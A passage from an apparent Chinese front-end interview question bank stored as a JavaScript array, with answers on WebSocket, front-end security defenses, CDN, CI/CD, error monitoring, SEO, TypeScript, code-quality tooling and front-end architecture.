**服务器（Node.js + ws 库）：**
\`\`\`javascript
const { WebSocketServer } = require('ws')
const wss = new WebSocketServer({ port: 8080 })

wss.on('connection', (ws, req) => {
  console.log('新连接:', req.socket.remoteAddress)
  
  ws.on('message', (data) => {
    console.log('收到:', data.toString())
    // 广播给所有客户端
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(data.toString())
      }
    })
  })
  
  ws.on('close', () => {
    console.log('连接关闭')
  })
})
\`\`\`

### 心跳机制

\`\`\`javascript
// 客户端心跳
let heartbeatInterval

ws.onopen = () => {
  heartbeatInterval = setInterval(() => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'ping' }))
    }
  }, 30000)  // 30秒
}

ws.onclose = () => {
  clearInterval(heartbeatInterval)
  // 自动重连
  setTimeout(reconnect, 3000)
}

// 服务器响应心跳
ws.on('message', (data) => {
  const msg = JSON.parse(data)
  if (msg.type === 'ping') {
    ws.send(JSON.stringify({ type: 'pong' }))
    return
  }
})
\`\`\`

### 自动重连

\`\`\`javascript
class ReconnectingWebSocket {
  constructor(url, options = {}) {
    this.url = url
    this.maxRetry = options.maxRetry || 5
    this.retryCount = 0
    this.connect()
  }
  
  connect() {
    this.ws = new WebSocket(this.url)
    this.ws.onopen = () => {
      this.retryCount = 0
      console.log('Connected')
    }
    this.ws.onclose = () => {
      if (this.retryCount < this.maxRetry) {
        this.retryCount++
        const delay = Math.min(1000 * 2 ** this.retryCount, 30000)
        setTimeout(() => this.connect(), delay)
      }
    }
    this.ws.onmessage = (e) => this.onMessage?.(e.data)
  }
  
  send(data) {
    if (this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(data)
    }
  }
}
\`\`\`

### WebSocket vs SSE vs 轮询

| 方式 | 方向 | 开销 | 适合场景 |
|------|------|------|----------|
| 轮询 | 单向 | 大 | 简单场景 |
| 长轮询 | 单向 | 中 | 兼容性好 |
| SSE | 服务器→客户端 | 小 | 通知/推送 |
| WebSocket | 双向 | 最小 | 聊天/实时 |

### SSE 替代方案

如果只需要服务器推送（不需要客户端→服务器），SSE 更简单：
\`\`\`javascript
const source = new EventSource('/api/stream')
source.onmessage = (e) => {
  console.log(e.data)
}
source.onerror = () => source.close()
\`\`\`

### 适用场景
- ✅ 聊天应用
- ✅ 实时游戏
- ✅ 协同编辑
- ✅ 实时数据推送
- ❌ 简单的请求-响应（用 HTTP 即可）`
  },
  {
    id: 'be-023',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['前端安全', 'CSP', '同源策略'],
    question: '前端安全有哪些常见威胁？如何防范？',
    answer: `### 常见安全威胁

### 1. XSS（跨站脚本攻击）
（详见 BE-005）

### 2. CSRF（跨站请求伪造）
（详见 BE-005）

### 3. 点击劫持（Clickjacking）

攻击者用透明 iframe 覆盖在页面上，诱导用户点击。

**防御：**
\`\`\`javascript
// 方法 1：X-Frame-Options 响应头
X-Frame-Options: DENY              // 禁止嵌入
X-Frame-Options: SAMEORIGIN        // 只允许同源嵌入

// 方法 2：CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'self'

// 方法 3：JS 检测
if (window.top !== window.self) {
  window.top.location = window.self.location
}
\`\`\`

### 4. 中间人攻击（MITM）

攻击者截获通信数据。

**防御：**
- 使用 HTTPS
- HSTS 头：\`Strict-Transport-Security: max-age=31536000\`
- 证书固定（Certificate Pinning）

### 5. SQL 注入

攻击者通过输入恶意 SQL 操作数据库。

**防御：**
\`\`\`javascript
// ❌ 字符串拼接
const sql = \`SELECT * FROM users WHERE name = '\${name}'\`

// ✅ 参数化查询
db.query('SELECT * FROM users WHERE name = ?', [name])
\`\`\`

### 6. CSP（内容安全策略）

\`\`\`
Content-Security-Policy:
  default-src 'self';                    # 默认只加载同源
  script-src 'self' cdn.example.com;     # 脚本来源
  style-src 'self' 'unsafe-inline';      # 样式来源
  img-src 'self' data: https:;          # 图片来源
  connect-src 'self' https://api.example.com; # AJAX 来源
  font-src 'self' https://fonts.googleapis.com;
  frame-ancestors 'none';                # 禁止被嵌入
  report-uri /csp-report;                # 违规报告
\`\`\`

### 7. 敏感数据泄露

\`\`\`javascript
// ❌ 密钥硬编码
const API_KEY = 'sk-xxxxx'

// ✅ 环境变量
const API_KEY = process.env.API_KEY

// ❌ Token 存 localStorage（JS 可读）
// ✅ Token 存 HttpOnly Cookie

// ❌ 控制台输出敏感信息
console.log(user.password)
\`\`\`

### 8. 依赖安全

\`\`\`bash
# 检查依赖漏洞
npm audit
npm audit fix

# 使用 Snyk 等工具
npx snyk test
\`\`\`

### 安全 Headers 汇总

\`\`\`
# HTTPS 强制
Strict-Transport-Security: max-age=31536000; includeSubDomains

# XSS 防护
X-XSS-Protection: 1; mode=block

# MIME 类型嗅探
X-Content-Type-Options: nosniff

# 点击劫持
X-Frame-Options: DENY

# CSP
Content-Security-Policy: default-src 'self'

# Referrer 控制
Referrer-Policy: strict-origin-when-cross-origin

# 权限策略
Permissions-Policy: geolocation=(), microphone=()
\`\`\`

### 前端安全检查清单
- [ ] 所有用户输入都经过转义
- [ ] 使用 HTTPS
- [ ] 设置安全响应头
- [ ] Token 使用 HttpOnly Cookie
- [ ] 依赖定期更新和审计
- [ ] 不在代码中硬编码密钥
- [ ] CORS 配置正确
- [ ] 错误信息不泄露敏感数据`
  },
  {
    id: 'be-024',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['CDN', 'DNS', '网络优化'],
    question: 'CDN 的工作原理是什么？前端如何利用 CDN 优化？',
    answer: `### CDN（Content Delivery Network）

内容分发网络，将资源缓存到全球各地的边缘节点，用户就近获取，减少延迟。

### 工作原理

\`\`\`
用户请求 cdn.example.com/image.jpg
  → DNS 解析：返回最近的 CDN 边缘节点 IP
  → 用户请求边缘节点
  → 边缘节点有缓存？→ 直接返回（缓存命中）
  → 无缓存 → 回源站获取 → 缓存并返回
\`\`\`

### DNS 智能解析

\`\`\`
普通 DNS：
  example.com → 固定 IP

CDN DNS：
  cdn.example.com → CNAME → xxx.cdn-provider.net
  → 根据用户 IP 返回最近的边缘节点 IP
  
  北京用户 → 北京节点 IP
  广州用户 → 广州节点 IP
  美国用户 → 美国节点 IP
\`\`\`

### CDN 缓存策略

\`\`\`
# 静态资源（JS/CSS/图片）
Cache-Control: public, max-age=31536000, immutable
# 内容变化时文件名变（哈希），所以可以长期缓存

# HTML
Cache-Control: no-cache
# 每次回源验证

# API 响应
Cache-Control: private, no-cache
# 不经过 CDN 缓存
\`\`\`

### 前端利用 CDN

**1. 静态资源部署到 CDN**

\`\`\`javascript
// Vite 配置
export default {
  base: 'https://cdn.example.com/assets/'
  // 所有资源路径前缀变为 CDN 地址
}

// HTML 引用
<script src="https://cdn.example.com/assets/app.a1b2c3.js"></script>
\`\`\`

**2. 第三方库使用 CDN**

\`\`\`html
<!-- 使用公共 CDN -->
<script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.js"></script>
<script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
\`\`\`

**3. 构建时 externals**

\`\`\`javascript
// Vite 配置：不打包 vue/react，使用 CDN
export default {
  build: {
    rollupOptions: {
      external: ['vue', 'vue-router']
    }
  }
}

// HTML 中引入 CDN
<script src="https://cdn.jsdelivr.net/npm/vue@3"></script>
\`\`\`

**4. 图片 CDN**

\`\`\`html
<!-- 图片 CDN + 响应式 -->
<img 
  src="https://imgcdn.example.com/photo.jpg?w=800"
  srcset="https://imgcdn.example.com/photo.jpg?w=400 400w,
          https://imgcdn.example.com/photo.jpg?w=800 800w"
/>
\`\`\`

### CDN 加速类型

| 类型 | 说明 | 示例 |
|------|------|------|
| 静态加速 | 缓存 JS/CSS/图片 | Cloudflare、阿里云 CDN |
| 动态加速 | 优化路由、TCP 优化 | 阿里云 DCDN |
| 下载加速 | 大文件分发 | 软件下载 |
| 视频加速 | 流媒体分发 | 直播/点播 |
| 安全加速 | WAF + DDoS 防护 | Cloudflare |

### CDN 回源

边缘节点缓存未命中时，向源站请求：

\`\`\`
边缘节点 → 源站（你的服务器/OSS）
\`\`\`

**回源率**：回源请求 / 总请求。优化目标：降低回源率。

### CDN 刷新/预热
- **刷新**：主动清除缓存（发布新版本时）
- **预热**：主动预加载资源到边缘节点（大促前）

### 常见 CDN 提供商
- **国际**：Cloudflare、AWS CloudFront、Akamai
- **国内**：阿里云 CDN、腾讯云 CDN、七牛云`
  },
  {
    id: 'be-025',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['CI/CD', '自动化', '部署'],
    question: '前端 CI/CD 流程是怎样的？如何实现自动化部署？',
    answer: `### CI/CD 概念

- **CI**（持续集成）：代码推送后自动构建、测试
- **CD**（持续交付/部署）：自动部署到测试/生产环境

### 典型前端 CI/CD 流程

\`\`\`
代码推送 → 触发 CI → 安装依赖 → 代码检查 → 构建 → 测试 → 部署
                                                       ↓
                                              测试环境 / 预发布 / 生产
\`\`\`

### GitHub Actions 示例

\`\`\`yaml
# .github/workflows/deploy.yml
name: Build and Deploy

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install
        run: npm ci
      
      - name: Lint
        run: npm run lint
      
      - name: Test
        run: npm run test:unit
      
      - name: Build
        run: npm run build
        env:
          VITE_API_URL: \${{ secrets.API_URL }}
      
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/
  
  deploy-staging:
    needs: build
    if: github.ref == 'refs/heads/develop'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: dist
          path: dist
      
      - name: Deploy to Staging
        uses: appleboy/scp-action@v0.1.7
        with:
          host: \${{ secrets.STAGING_HOST }}
          username: \${{ secrets.SSH_USER }}
          key: \${{ secrets.SSH_KEY }}
          source: 'dist/*'
          target: '/var/www/staging'
  
  deploy-production:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production  # 需要审批
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: dist
          path: dist
      
      - name: Deploy to CDN
        run: |
          npx aliyun-cdn-cli deploy --path dist/
        env:
          CDN_KEY: \${{ secrets.CDN_KEY }}
\`\`\`

### 分支策略

\`\`\`
main      → 自动部署到生产
develop   → 自动部署到预发布
feature/* → CI 构建+测试，不部署
hotfix/*  → 紧急修复，直接合并 main
\`\`\`

### 常用 CI/CD 工具

| 工具 | 特点 |
|------|------|
| GitHub Actions | GitHub 集成、免费额度 |
| GitLab CI | GitLab 集成、自托管 |
| Jenkins | 老牌、自托管、插件多 |
| CircleCI | 云端、速度快 |
| Vercel | 前端友好、零配置 |
| Netlify | 前端友好、零配置 |

### Vercel 零配置部署

\`\`\`bash
# 安装 CLI
npm i -g vercel

# 部署
vercel        # 预览环境
vercel --prod # 生产环境
\`\`\`

连接 GitHub 仓库后，推送代码自动部署。

### Docker 部署

\`\`\`dockerfile
# Dockerfile
FROM node:20-alpine as build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
\`\`\`

\`\`\`yaml
# docker-compose.yml
services:
  web:
    build: .
    ports:
      - "80:80"
\`\`\`

### 环境变量管理
\`\`\`
# .env.development
VITE_API_URL=http://localhost:3000

# .env.staging
VITE_API_URL=https://api.staging.example.com

# .env.production
VITE_API_URL=https://api.example.com
\`\`\`

构建时注入：\`npm run build -- --mode staging\`

### 最佳实践
1. **代码推送即触发** CI
2. **测试不通过不部署**
3. **生产部署需要审批**（environment protection）
4. **回滚机制**：保留历史版本，快速回滚
5. **蓝绿部署/灰度发布**：降低风险`
  },
  {
    id: 'be-026',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['监控', '错误监控', '埋点'],
    question: '前端监控包含哪些方面？如何实现错误监控？',
    answer: `### 前端监控三大领域

1. **错误监控**：JS 错误、资源加载失败、API 错误
2. **性能监控**：加载时间、FCP、LCP、白屏时间
3. **行为监控**：PV/UV、点击流、用户路径

### 错误监控

**1. JS 运行时错误**
\`\`\`javascript
window.addEventListener('error', (event) => {
  report({
    type: 'js_error',
    message: event.message,
    filename: event.filename,
    lineno: event.lineno,
    colno: event.colno,
    stack: event.error?.stack,
    timestamp: Date.now()
  })
}, true)
\`\`\`

**2. Promise 未捕获异常**
\`\`\`javascript
window.addEventListener('unhandledrejection', (event) => {
  report({
    type: 'promise_error',
    reason: event.reason?.message || event.reason,
    stack: event.reason?.stack,
    timestamp: Date.now()
  })
})
\`\`\`

**3. 资源加载错误**
\`\`\`javascript
window.addEventListener('error', (event) => {
  const target = event.target
  if (target && (target.tagName === 'IMG' || target.tagName === 'SCRIPT' || target.tagName === 'LINK')) {
    report({
      type: 'resource_error',
      tagName: target.tagName,
      src: target.src || target.href,
      timestamp: Date.now()
    })
  }
}, true)  // 必须用捕获阶段
\`\`\`

**4. 接口错误**
\`\`\`javascript
// 拦截 fetch
const originalFetch = window.fetch
window.fetch = async (...args) => {
  const [url, options] = args
  const startTime = Date.now()
  try {
    const response = await originalFetch(...args)
    if (!response.ok) {
      report({
        type: 'api_error',
        url: typeof url === 'string' ? url : url.url,
        status: response.status,
        duration: Date.now() - startTime
      })
    }
    return response
  } catch (error) {
    report({
      type: 'api_error',
      url: typeof url === 'string' ? url : url.url,
      error: error.message,
      duration: Date.now() - startTime
    })
    throw error
  }
}

// 拦截 XMLHttpRequest
const originalOpen = XMLHttpRequest.prototype.open
const originalSend = XMLHttpRequest.prototype.send
XMLHttpRequest.prototype.open = function(method, url, ...args) {
  this._url = url
  this._method = method
  this._startTime = Date.now()
  originalOpen.call(this, method, url, ...args)
}
XMLHttpRequest.prototype.send = function(...args) {
  this.addEventListener('loadend', () => {
    if (this.status >= 400) {
      report({
        type: 'api_error',
        url: this._url,
        method: this._method,
        status: this.status,
        duration: Date.now() - this._startTime
      })
    }
  })
  originalSend.call(this, ...args)
}
\`\`\`

### 性能监控

\`\`\`javascript
// Web Vitals
import { onCLS, onFID, onLCP, onFCP, onTTFB } from 'web-vitals'

onCLS(console.log)   // 累积布局偏移
onFID(console.log)   // 首次输入延迟
onLCP(console.log)   // 最大内容绘制
onFCP(console.log)   // 首次内容绘制
onTTFB(console.log)  // 首字节时间

// Performance API
const timing = performance.getEntriesByType('navigation')[0]
console.log({
  dns: timing.domainLookupEnd - timing.domainLookupStart,
  tcp: timing.connectEnd - timing.connectStart,
  ttfb: timing.responseStart - timing.requestStart,
  domReady: timing.domComplete - timing.domLoading,
  load: timing.loadEventEnd - timing.fetchStart
})
\`\`\`

### 上报方案

\`\`\`javascript
function report(data) {
  data.userAgent = navigator.userAgent
  data.url = location.href
  data.userId = getUserId()
  
  // 方案 1：sendBeacon（推荐，页面卸载时也能发送）
  if (navigator.sendBeacon) {
    const blob = new Blob([JSON.stringify(data)], { type: 'application/json' })
    navigator.sendBeacon('/api/monitor', blob)
    return
  }
  
  // 方案 2：fetch keepalive
  fetch('/api/monitor', {
    method: 'POST',
    body: JSON.stringify(data),
    keepalive: true
  })
  
  // 方案 3：Image（简单但只支持 GET）
  new Image().src = \`/api/monitor?data=\${encodeURIComponent(JSON.stringify(data))}\`
}
\`\`\`

### Source Map 还原

生产环境代码经过压缩混淆，错误堆栈不可读：
\`\`\`javascript
// 服务器端使用 source-map 库还原
const sourceMap = require('source-map')
const fs = require('fs')

async function还原(line, column) {
  const rawSourceMap = JSON.parse(fs.readFileSync('app.js.map', 'utf8'))
  const consumer = await new sourceMap.SourceMapConsumer(rawSourceMap)
  const original = consumer.originalPositionFor({ line, column })
  console.log(original.source, original.line, original.name)
}
\`\`\`

### 常用监控工具

| 工具 | 特点 |
|------|------|
| Sentry | 错误监控、Source Map |
| LogRocket | 录屏回放 |
| Google Analytics | 行为分析 |
| 阿里云 ARMS | 全链路监控 |
| Datadog | 全栈监控 |

### 监控指标
- **错误率**：错误数 / PV
- **API 成功率**：成功请求 / 总请求
- **平均响应时间**
- **白屏时间**
- **核心 Web Vitals**`
  },
  {
    id: 'be-027',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['SEO', '搜索引擎', '元数据'],
    question: '前端如何做 SEO 优化？',
    answer: `### SEO 核心原则

1. **可爬取**：搜索引擎能访问页面内容
2. **可索引**：页面能被搜索引擎收录
3. **内容相关**：页面内容与搜索关键词匹配
4. **性能好**：加载速度影响排名

### 技术优化

**1. 语义化 HTML**
\`\`\`html
<!-- ✅ 语义化标签 -->
<header>
  <nav>导航</nav>
</header>
<main>
  <article>
    <h1>标题</h1>
    <p>内容</p>
  </article>
  <aside>侧边栏</aside>
</main>
<footer>页脚</footer>

<!-- ❌ 全 div -->
<div class="header">
  <div class="nav">导航</div>
</div>
\`\`\`

**2. Meta 标签**
\`\`\`html
<head>
  <title>页面标题 - 品牌（60字符以内）</title>
  <meta name="description" content="页面描述（160字符以内）">
  <meta name="keywords" content="关键词1, 关键词2">
  <link rel="canonical" href="https://example.com/page">
  
  <!-- Open Graph（社交媒体分享）-->
  <meta property="og:title" content="标题">
  <meta property="og:description" content="描述">
  <meta property="og:image" content="https://example.com/image.jpg">
  <meta property="og:url" content="https://example.com/page">
</head>
\`\`\`

**3. SSR/SSG（关键！）**

\`\`\`javascript
// CSR（客户端渲染）→ SEO 差
// 搜索引擎可能不执行 JS，看到空页面

// SSR（服务端渲染）→ SEO 好
// 服务器返回完整 HTML

// SSG（静态生成）→ SEO 好
// 构建时生成 HTML

// Next.js / Nuxt.js 提供 SSR/SSG
\`\`\`

**4. 结构化数据（Schema.org）**
\`\`\`html
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Article",
  "headline": "文章标题",
  "author": { "@type": "Person", "name": "作者" },
  "datePublished": "2024-01-01",
  "image": "https://example.com/image.jpg"
}
</script>
\`\`\`

**5. sitemap.xml 和 robots.txt**
\`\`\`xml
<!-- sitemap.xml -->
<urlset>
  <url>
    <loc>https://example.com/page1</loc>
    <lastmod>2024-01-01</lastmod>
    <changefreq>weekly</changefreq>
    <priority>0.8</priority>
  </url>
</urlset>
\`\`\`

\`\`\`
# robots.txt
User-agent: *
Allow: /
Disallow: /admin/
Sitemap: https://example.com/sitemap.xml
\`\`\`

**6. 性能优化**
- Core Web Vitals 达标（LCP < 2.5s, FID < 100ms, CLS < 0.1）
- 图片懒加载 + WebP
- 预渲染关键路径

### 内容优化

\`\`\`html
<!-- 标题层级 -->
<h1>主标题（每页一个）</h1>
<h2>次标题</h2>
<h3>三级标题</h3>

<!-- 图片 alt -->
<img src="cat.jpg" alt="一只橘猫在晒太阳">

<!-- 链接描述 -->
<a href="/about">关于我们</a>  <!-- ✅ -->
<a href="/about">点击这里</a>   <!-- ❌ -->

<!-- 面包屑导航 -->
<nav>
  <a href="/">首页</a> > <a href="/blog">博客</a> > <span>文章标题</span>
</nav>
\`\`\`

### SPA SEO 挑战

\`\`\`javascript
// SPA（CSR）的问题：
// 1. 初始 HTML 为空（只有一个 <div id="app"></div>）
// 2. 路由切换不改变 URL（需要 History API）
// 3. 搜索引擎可能不执行 JS

// 解决方案：
// 1. 使用 SSR（Next.js / Nuxt.js）
// 2. 预渲染（prerender-spa-plugin）
// 3. 动态渲染（检测爬虫 UA 返回 SSR 内容）
\`\`\`

### SEO 检查清单
- [ ] 使用 SSR/SSG
- [ ] 每页有唯一的 title 和 description
- [ ] 语义化 HTML
- [ ] 图片有 alt 属性
- [ ] 有 sitemap.xml
- [ ] 有 robots.txt
- [ ] 使用 HTTPS
- [ ] 移动端适配
- [ ] Core Web Vitals 达标
- [ ] 结构化数据标记
- [ ] 内部链接合理
- [ ] 规范化 URL（canonical）`
  },
  {
    id: 'be-028',
    category: 'typescript',
    module: 'lang',
    difficulty: 'medium',
    tags: ['TypeScript', '类型系统', '泛型'],
    question: 'TypeScript 相比 JavaScript 有什么优势？常用类型有哪些？',
    answer: `### TS 优势

1. **类型安全**：编译时发现错误
2. **智能提示**：IDE 自动补全更准确
3. **代码可读性**：类型即文档
4. **重构友好**：改类型后编译器报错引导修改
5. **大型项目协作**：接口契约清晰

### 常用类型

\`\`\`typescript
// 基本类型
let name: string = 'Tom'
let age: number = 25
let isReady: boolean = true

// 数组
let nums: number[] = [1, 2, 3]
let strs: Array<string> = ['a', 'b']

// 元组
let tuple: [string, number] = ['Tom', 25]

// 联合类型
let id: string | number = 123

// 字面量类型
let status: 'idle' | 'loading' | 'success' | 'error'

// 枚举
enum Color { Red, Green, Blue }
let c: Color = Color.Green

// any / unknown / never
let a: any = 1         // 不检查（避免使用）
let b: unknown = 1     // 安全的 any，使用前需类型检查
function f(): never { throw new Error() }  // 永不返回

// void
function log(msg: string): void { console.log(msg) }
\`\`\`

### 接口与类型别名

\`\`\`typescript
// interface
interface User {
  id: number
  name: string
  age?: number           // 可选属性
  readonly email: string  // 只读属性
}

// type
type Status = 'idle' | 'loading' | 'success'
type Point = { x: number; y: number }

// interface 可合并（声明合并）
interface Window { myProp: string }  // 扩展全局
\`\`\`

### 泛型

\`\`\`typescript
// 泛型函数
function identity<T>(value: T): T {
  return value
}
identity<string>('hello')  // T = string
identity(123)              // 自动推断 T = number

// 泛型约束
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key]
}
const user = { name: 'Tom', age: 25 }
getProperty(user, 'name')  // string
getProperty(user, 'age')   // number

// 泛型默认值
interface ApiResponse<T = any> {
  code: number
  data: T
}

// 泛型在类中
class Stack<T> {
  private items: T[] = []
  push(item: T) { this.items.push(item) }
  pop(): T | undefined { return this.items.pop() }
}
\`\`\`

### 工具类型

\`\`\`typescript
// Partial：所有属性可选
type PartialUser = Partial<User>
// { id?: number; name?: string; age?: number; email?: string }

// Required：所有属性必填
type RequiredUser = Required<User>

// Pick：选取部分属性
type UserBasic = Pick<User, 'id' | 'name'>
// { id: number; name: string }

// Omit：排除部分属性
type UserWithoutId = Omit<User, 'id'>

// Record：键值对
type UserMap = Record<string, User>

// ReturnType：获取函数返回类型
function fetchData() { return { name: 'Tom' } }
type Data = ReturnType<typeof fetchData>  // { name: string }

// Parameters：获取函数参数类型
type Params = Parameters<typeof fetchData>

// Awaited：获取 Promise 返回类型
type Result = Awaited<Promise<User>>  // User
\`\`\`

### 类型断言与类型守卫

\`\`\`typescript
// 类型断言
let el = document.querySelector('#app') as HTMLDivElement
let value = someValue as string

// 类型守卫
function process(value: string | number) {
  if (typeof value === 'string') {
    value.toUpperCase()  // string
  } else {
    value.toFixed(2)     // number
  }
}

// instanceof
class Dog { bark() {} }
class Cat { meow() {} }
function speak(animal: Dog | Cat) {
  if (animal instanceof Dog) animal.bark()
  else animal.meow()
}

// in
interface Fish { swim() }
interface Bird { fly() }
function move(animal: Fish | Bird) {
  if ('swim' in animal) animal.swim()
  else animal.fly()
}

// 自定义类型守卫
function isUser(obj: any): obj is User {
  return obj && typeof obj.id === 'number' && typeof obj.name === 'string'
}
if (isUser(data)) {
  data.name  // User 类型
}
\`\`\`

### 最佳实践
- 严格模式：\`"strict": true\`
- 避免 \`any\`，用 \`unknown\` 代替
- 接口定义 API 响应
- 泛型提高复用性
- 善用工具类型`
  },
  {
    id: 'be-029',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['代码质量', 'ESLint', 'Prettier', '测试'],
    question: '前端代码质量保障有哪些手段？ESLint、Prettier、测试如何配置？',
    answer: `### ESLint

\`\`\`javascript
// eslint.config.js（Flat Config，ESLint 9+）
import js from '@eslint/js'
import vue from 'eslint-plugin-vue'
import tsParser from '@typescript-eslint/parser'

export default [
  js.configs.recommended,
  ...vue.configs['flat/recommended'],
  {
    files: ['**/*.{js,ts,vue}'],
    languageOptions: {
      parser: tsParser,
    },
    rules: {
      'no-unused-vars': 'error',
      'no-console': 'warn',
      'prefer-const': 'error',
      'vue/multi-word-component-names': 'off'
    }
  }
]
\`\`\`

**常用规则：**
- \`no-unused-vars\`：未使用变量
- \`no-console\`：禁用 console
- \`eqeqeq\`：必须用 ===
- \`prefer-const\`：优先 const
- \`no-var\`：禁用 var

### Prettier

\`\`\`json
// .prettierrc
{
  "semi": false,
  "singleQuote": true,
  "tabWidth": 2,
  "trailingComma": "none",
  "printWidth": 100,
  "arrowParens": "avoid"
}
\`\`\`

**ESLint + Prettier 集成：**
\`\`\`bash
npm install -D eslint-config-prettier
\`\`\`
\`\`\`javascript
// 关闭与 Prettier 冲突的 ESLint 规则
export default [
  ...otherConfigs,
  'prettier'  // 放在最后
]
\`\`\`

### Git Hooks（Husky + lint-staged）

\`\`\`bash
npm install -D husky lint-staged
npx husky init
\`\`\`

\`\`\`json
// package.json
{
  "lint-staged": {
    "*.{js,ts,vue}": ["eslint --fix", "prettier --write"],
    "*.{css,scss,json,md}": ["prettier --write"]
  }
}
\`\`\`

\`\`\`bash
# .husky/pre-commit
npx lint-staged
\`\`\`

### commitlint（提交规范）

\`\`\`bash
npm install -D @commitlint/cli @commitlint/config-conventional
\`\`\`

\`\`\`javascript
// commitlint.config.js
export default {
  extends: ['@commitlint/config-conventional'],
  rules: {
    'type-enum': [2, 'always', [
      'feat', 'fix', 'docs', 'style', 'refactor',
      'perf', 'test', 'build', 'ci', 'chore', 'revert'
    ]]
  }
}
\`\`\`

\`\`\`bash
# .husky/commit-msg
npx --no-install commitlint --edit $1
\`\`\`

提交格式：\`feat: 添加用户登录功能\`

### 测试

**单元测试（Vitest）：**
\`\`\`javascript
// sum.test.js
import { describe, it, expect } from 'vitest'
import { sum } from './sum'

describe('sum', () => {
  it('should add two numbers', () => {
    expect(sum(1, 2)).toBe(3)
  })
  
  it('should handle negative numbers', () => {
    expect(sum(-1, -2)).toBe(-3)
  })
})
\`\`\`

**组件测试（Testing Library）：**
\`\`\`javascript
import { render, screen, fireEvent } from '@testing-library/vue'
import Counter from './Counter.vue'

test('increments on click', async () => {
  render(Counter)
  await fireEvent.click(screen.getByText('Count: 0'))
  expect(screen.getByText('Count: 1')).toBeTruthy()
})
\`\`\`

**E2E 测试（Playwright）：**
\`\`\`javascript
import { test, expect } from '@playwright/test'

test('login flow', async ({ page }) => {
  await page.goto('/login')
  await page.fill('[data-testid=email]', 'user@test.com')
  await page.fill('[data-testid=password]', 'password')
  await page.click('[data-testid=submit]')
  await expect(page).toHaveURL('/dashboard')
})
\`\`\`

### 代码质量工具汇总

| 工具 | 作用 |
|------|------|
| ESLint | 代码规范检查 |
| Prettier | 代码格式化 |
| Husky | Git Hooks |
| lint-staged | 只检查暂存文件 |
| commitlint | 提交信息规范 |
| Vitest/Jest | 单元测试 |
| Testing Library | 组件测试 |
| Playwright/Cypress | E2E 测试 |
| TypeScript | 类型检查 |
| SonarQube | 代码质量扫描 |`
  },
  {
    id: 'be-030',
    category: 'micro-frontend',
    module: 'render',
    difficulty: 'medium',
    tags: ['低代码', '前端架构', '趋势'],
    question: '前端架构有哪些常见模式？微前端、低代码、BFF 是什么？',
    answer: `### 前端架构演进

\`\`\`
单体应用 → 组件化 → 模块化 → 微前端 → 低代码
\`\`\`

### 1. BFF（Backend for Frontend）

为前端定制的后端层，聚合多个微服务的数据。

\`\`\`
前端 → BFF → 微服务A、微服务B、微服务C
      ↑
   数据聚合、格式转换、缓存
\`\`\`

**优势：**
- 前端只需一次请求获取所有数据
- 避免前端直接依赖多个服务
- 可以做数据裁剪和格式转换

**技术栈：** Node.js (Nest.js / Express)、GraphQL

\`\`\`javascript
// BFF 示例
app.get('/dashboard', async (req, res) => {
  const [user, orders, notifications] = await Promise.all([
    userService.getUser(req.userId),
    orderService.getOrders(req.userId),
    notificationService.getNotifications(req.userId)
  ])
  res.json({ user, orders, notifications })
})
\`\`\`

### 2. Monorepo（单仓库多项目）

\`\`\`
my-project/
├── packages/
│   ├── ui/          # 共享 UI 组件库
│   ├── utils/       # 共享工具函数
│   ├── types/       # 共享类型定义
│   ├── web/         # Web 应用
│   ├── mobile/      # 移动应用
│   └── admin/       # 管理后台
├── package.json
└── turbo.json       # Turborepo 配置
\`\`\`

**工具：** Turborepo、Nx、pnpm workspaces

### 3. 低代码（Low-Code）

通过可视化拖拽生成页面，减少手写代码。

**核心能力：**
- 可视化编辑器
- 组件物料库
- 属性配置面板
- 代码生成/运行时渲染
- 数据源绑定

\`\`\`javascript
// 页面 Schema
{
  "type": "page",
  "children": [
    {
      "type": "form",
      "props": { "title": "用户信息" },
      "children": [
        { "type": "input", "props": { "label": "姓名", "field": "name" } },
        { "type": "select", "props": { "label": "角色", "field": "role", "options": [...] } }
      ]
    }
  ]
}

// 渲染器
function renderSchema(node) {
  const Component = componentMap[node.type]
  return (
    <Component {...node.props}>
      {node.children?.map(renderSchema)}
    </Component>
  )
}
\`\`\`

### 4. 微前端

（详见 FW-035）

### 5. 组件库设计

\`\`\`javascript
// 设计系统
├── tokens/          # 设计变量（颜色、间距、字体）
├── primitives/      # 原子组件（Button、Input）
├── components/      # 业务组件（Form、Table）
├── templates/       # 页面模板
└── theme/           # 主题配置
\`\`\`

**Headless UI 趋势：**
\`\`\`javascript
// 逻辑与 UI 分离
// Headless Hooks（如 @tanstack/react-table）
const table = useTable({ columns, data })
// table.getRowModel() 等纯逻辑 API
// 你自己写 UI
\`\`\`

### 架构选择

| 场景 | 推荐架构 |
|------|----------|
| 小型项目 | 组件化 + Vite |
| 中型项目 | 模块化 + 状态管理 |
| 大型项目 | Monorepo + 微前端 |
| 中后台 | 低代码平台 |
